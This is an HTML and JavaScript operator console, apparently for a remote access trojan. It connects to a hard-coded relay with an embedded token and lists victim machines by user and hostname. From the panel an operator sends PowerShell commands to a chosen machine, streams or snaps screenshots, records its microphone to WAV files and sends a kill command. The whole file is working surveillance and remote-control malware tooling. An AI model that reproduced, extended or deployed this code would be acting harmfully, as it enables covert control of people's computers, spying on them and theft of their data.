<!doctype html>
<html><head><meta charset="utf-8">
<title>ops</title>
<style>
  body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
  #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
  #agents{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:6px;min-width:280px}
  #out{background:#000;color:#9f9;border:1px solid #333;padding:8px;height:40vh;overflow:auto;white-space:pre-wrap;font-size:13px}
  #cmd{width:100%;background:#000;color:#fff;border:1px solid #333;padding:8px;font-family:inherit;box-sizing:border-box}
  button{background:#333;color:#fff;border:1px solid #555;padding:6px 10px;cursor:pointer}
  button:hover{background:#444}
  button:disabled{opacity:.4;cursor:not-allowed}
  #shot{max-width:100%;border:1px solid #333;margin-top:12px;display:block;background:#000;min-height:40px}
  #status{color:#888;font-size:12px}
  #micwrap{display:flex;gap:6px;align-items:center;margin-top:8px;flex-wrap:wrap}
  #vu{width:160px;height:10px;background:#222;border:1px solid #333}
  #vu>div{height:100%;width:0%;background:#0f0;transition:width .05s linear}
  #audstat{color:#888;font-size:12px}
  #recstat{color:#0f0;font-size:12px}
  #recwrap{display:flex;gap:8px;align-items:center;margin-top:8px}
  #recwrap input{width:280px;background:#000;color:#fff;border:1px solid #333;padding:6px;font-family:inherit}
</style></head>
<body>
<div id="hdr">
  <button id="connect">connect</button>
  <select id="agents"><option value="">-- pick target --</option></select>
  <button id="shot1">Single Screenshot</button>
  <button id="shot2">Stream ON</button>
  <button id="shot3">Stream OFF</button>
  <button id="kill">kill</button>
  <span id="status">idle</span>
</div>

<div id="micwrap">
  <span style="color:#888;font-size:12px">mic VU:</span>
  <div id="vu"><div></div></div>
  <span id="audstat">mic: idle</span>
  <span id="recstat">record: idle</span>
</div>

<div id="recwrap">
  <button id="recStart">🎙 Start Recording</button>
  <button id="recStop" disabled>⏹ Stop &amp; Save</button>
  <input id="recName" value="mic_capture" placeholder="file name (no ext)">
  <span style="color:#888;font-size:12px" id="recInfo"></span>
</div>

<div id="out"></div>
<input id="cmd" placeholder="PowerShell — press Enter to send">
<img id="shot" alt="">

<script>
// =========================================================================
// FILL — relay URL and token
// =========================================================================
const RELAY = "wss://operator-nmth.onrender.com/ws";
const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";

// =========================================================================
// DOM
// =========================================================================
const outEl     = document.getElementById('out');
const agentsEl  = document.getElementById('agents');
const shotEl    = document.getElementById('shot');
const statusEl  = document.getElementById('status');
const vuEl      = document.querySelector('#vu > div');
const audstatEl = document.getElementById('audstat');
const recstatEl = document.getElementById('recstat');
const recInfoEl = document.getElementById('recInfo');
const recStartBtn = document.getElementById('recStart');
const recStopBtn  = document.getElementById('recStop');
const recNameEl   = document.getElementById('recName');

// =========================================================================
// State
// =========================================================================
let ws = null;
let attachedId = null;
let frames = 0;
let outs = 0;

// Recording
let recording = false;
let recStartedAt = 0;
let recChunks = 0;
let recSamples = 0;                // total int16 samples captured
let recPeak = 0;                   // peak amplitude seen across capture
let recBytes = null;               // Uint8Array accumulating raw PCM bytes
let recTicker = null;

const MIC_RATE = 16000;
const MIC_CH   = 1;
const MIC_BITS = 16;

// =========================================================================
// Helpers
// =========================================================================
function log(s){ outEl.textContent += s + "\n"; outEl.scrollTop = outEl.scrollHeight; }
function setStatus(s){ statusEl.textContent = s; }
function refreshStatus(){
  setStatus(`attached:${attachedId||'none'}  frames:${frames}  outs:${outs}`);
}
function b64ToU8(b64){
  const bin = atob(b64);
  const u8 = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; ++i) u8[i] = bin.charCodeAt(i);
  return u8;
}
function u8ToB64(u8){
  let bin = '';
  for (const b of u8) bin += String.fromCharCode(b);
  return btoa(bin);
}
function fmtTime(sec){
  const m = Math.floor(sec/60);
  const s = Math.floor(sec%60);
  return `${m}:${s.toString().padStart(2,'0')}`;
}

// =========================================================================
// Growable PCM byte accumulator
// =========================================================================
function appendPcm(bytes){
  if (!recBytes) {
    recBytes = new Uint8Array(65536);
    recBytes._len = 0;
  }
  const needed = recBytes._len + bytes.length;
  if (needed > recBytes.length) {
    let cap = recBytes.length;
    while (cap < needed) cap *= 2;
    const next = new Uint8Array(cap);
    next.set(recBytes.subarray(0, recBytes._len), 0);
    next._len = recBytes._len;
    recBytes = next;
  }
  recBytes.set(bytes, recBytes._len);
  recBytes._len += bytes.length;
}

// =========================================================================
// PCM -> WAV blob
// =========================================================================
function pcmToWavBlob(pcmBytes, rate, ch, bits){
  const dataLen = pcmBytes.length;
  const buf = new ArrayBuffer(44 + dataLen);
  const view = new DataView(buf);
  const w = (o, s) => { for (let i = 0; i < s.length; i++) view.setUint8(o+i, s.charCodeAt(i)); };
  w(0, 'RIFF');
  view.setUint32(4, 36 + dataLen, true);
  w(8, 'WAVE');
  w(12, 'fmt ');
  view.setUint32(16, 16, true);
  view.setUint16(20, 1, true);                              // PCM
  view.setUint16(22, ch, true);
  view.setUint32(24, rate, true);
  view.setUint32(28, rate * ch * bits / 8, true);           // byte rate
  view.setUint16(32, ch * bits / 8, true);                  // block align
  view.setUint16(34, bits, true);
  w(36, 'data');
  view.setUint32(40, dataLen, true);
  new Uint8Array(buf, 44).set(pcmBytes);
  return new Blob([buf], { type: 'audio/wav' });
}

// =========================================================================
// Download trigger
// =========================================================================
function saveBlob(blob, filename){
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => {
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, 1000);
}

// =========================================================================
// Connect
// =========================================================================
document.getElementById('connect').onclick = () => {
  setStatus('connecting…');
  ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
  ws.onopen = () => {
    setStatus('connected');
    log("[ws] connected");
    ws.send(JSON.stringify({op:'list'}));
  };
  ws.onclose = (e) => {
    setStatus('closed ' + (e.code || ''));
    log("[ws] closed " + (e.code || '') + ' ' + (e.reason || ''));
  };
  ws.onerror = () => { setStatus('error'); log("[ws] error"); };

  ws.onmessage = (ev) => {
    let m; try { m = JSON.parse(ev.data); } catch { return; }

    if (m.op === 'agents') {
      const cur = agentsEl.value;
      agentsEl.innerHTML = '<option value="">-- pick target --</option>';
      for (const a of (m.list || [])) {
        const o = document.createElement('option');
        o.value = a.id;
        o.textContent = `${a.id}  (${a.info?.user || '?'}@${a.info?.hostname || '?'})`;
        agentsEl.appendChild(o);
      }
      if (cur) agentsEl.value = cur;
      refreshStatus();

    } else if (m.op === 'attached') {
      attachedId = m.id;
      log(`[attach] ${m.id}`);
      refreshStatus();

    } else if (m.op === 'err') {
      log(`[err] ${m.reason}`);

    } else if (m.op === 'out') {
      outs++;
      try {
        const u8 = b64ToU8(m.data);
        log(new TextDecoder().decode(u8));
      } catch (e) { log("[out decode err] " + e.message); }
      refreshStatus();

    } else if (m.op === 'log') {
      log(`[agent] ${m.msg}`);

    } else if (m.op === 'frame') {
      frames++;
      shotEl.src = 'data:image/jpeg;base64,' + m.data;
      refreshStatus();

    } else if (m.op === 'pcm') {
      if (!recording) return;
      const bytes = b64ToU8(m.data);
      if (bytes.length < 2) return;

      // peak for VU / file metadata
      let peak = 0;
      for (let i = 0; i < bytes.length; i += 2) {
        let v = bytes[i] | (bytes[i+1] << 8);
        if (v & 0x8000) v |= ~0xffff;
        const a = (v < 0 ? -v : v) / 32768;
        if (a > peak) peak = a;
      }
      if (peak > recPeak) recPeak = peak;
      if (vuEl) vuEl.style.width = Math.min(100, Math.round(peak*100)) + '%';

      appendPcm(bytes);
      recChunks++;
      recSamples += bytes.length >> 1;
    }
  };
};

// =========================================================================
// Attach
// =========================================================================
agentsEl.onchange = () => {
  attachedId = agentsEl.value || null;
  if (attachedId && ws && ws.readyState === 1) {
    ws.send(JSON.stringify({op:'attach', id: attachedId}));
  }
  refreshStatus();
};

// =========================================================================
// Command
// =========================================================================
document.getElementById('cmd').addEventListener('keydown', (e) => {
  if (e.key !== 'Enter') return;
  const text = e.target.value; e.target.value = '';
  if (!text) return;
  if (!attachedId) { log("[no target]"); return; }
  if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
  const u8 = new TextEncoder().encode(text);
  ws.send(JSON.stringify({op:'in', data: u8ToB64(u8)}));
  log("> " + text);
});

// =========================================================================
// Screenshot
// =========================================================================
document.getElementById('shot1').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshotOnce'}));
  log("[shot] single requested");
};
document.getElementById('shot2').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshot', on:true}));
  log("[shot] stream ON");
};
document.getElementById('shot3').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshot', on:false}));
  log("[shot] stream OFF");
};

// =========================================================================
// RECORDING — record raw PCM, stop builds a WAV, save via download.
// =========================================================================
function startRecording(){
  if (!attachedId || !ws) { log("[no target]"); return; }
  if (recording) return;

  recBytes = new Uint8Array(65536);
  recBytes._len = 0;
  recChunks = 0;
  recSamples = 0;
  recPeak = 0;
  recStartedAt = Date.now();
  recording = true;

  recStartBtn.disabled = true;
  recStopBtn.disabled  = false;
  recstatEl.textContent = 'record: ● rec  0:00  0.00 MB';
  audstatEl.textContent = 'mic: streaming';

  // tell the agent to start streaming mic
  ws.send(JSON.stringify({op:'mic', on:true}));
  log("[rec] started");

  recTicker = setInterval(() => {
    const sec = (Date.now() - recStartedAt) / 1000;
    const mb  = (recBytes ? recBytes._len : 0) / (1024*1024);
    recstatEl.textContent = `record: ● rec  ${fmtTime(sec)}  ${mb.toFixed(2)} MB`;
  }, 250);
}

function stopRecording(){
  if (!recording) return;
  recording = false;

  // ask the agent to stop streaming
  if (ws && ws.readyState === 1) ws.send(JSON.stringify({op:'mic', on:false}));
  log("[rec] stopped");

  if (recTicker) { clearInterval(recTicker); recTicker = null; }

  const sec = (Date.now() - recStartedAt) / 1000;
  const bytesLen = recBytes ? recBytes._len : 0;

  recStartBtn.disabled = false;
  recStopBtn.disabled  = true;
  audstatEl.textContent = 'mic: idle';

  if (bytesLen === 0) {
    recstatEl.textContent = 'record: empty (no pcm received)';
    recInfoEl.textContent = 'no audio captured — target mic may be silent or stream never started';
    return;
  }

  // slice to actual length
  const pcmBytes = new Uint8Array(bytesLen);
  pcmBytes.set(recBytes.subarray(0, bytesLen));

  const blob = pcmToWavBlob(pcmBytes, MIC_RATE, MIC_CH, MIC_BITS);
  const safeName = (recNameEl.value || 'mic_capture')
                    .replace(/[^\w\-]/g, '_')
                    .slice(0, 60) || 'mic_capture';
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `${safeName}_${ts}.wav`;

  recstatEl.textContent =
    `record: saved  ${fmtTime(sec)}  ${(bytesLen/(1024*1024)).toFixed(2)} MB  peak ${recPeak.toFixed(2)}`;
  recInfoEl.textContent = `${filename} — ${(bytesLen/1024).toFixed(1)} KB, ${fmtTime(sec)}`;

  saveBlob(blob, filename);
}

recStartBtn.onclick = startRecording;
recStopBtn.onclick  = stopRecording;

// =========================================================================
// Kill
// =========================================================================
document.getElementById('kill').onclick = () => {
  if (!attachedId || !ws) return;
  ws.send(JSON.stringify({op:'kill'}));
  log("[kill] sent");
};

// debug
window.__dbg = function(){
  return {
    attachedId, recording,
    recChunks, recSamples,
    recBytesLen: recBytes ? recBytes._len : 0,
    recPeak: recPeak.toFixed(3),
    durationSec: recording ? (Date.now() - recStartedAt) / 1000 : 0,
    wsReady: ws ? ws.readyState : -1
  };
};
</script>
</body></html>
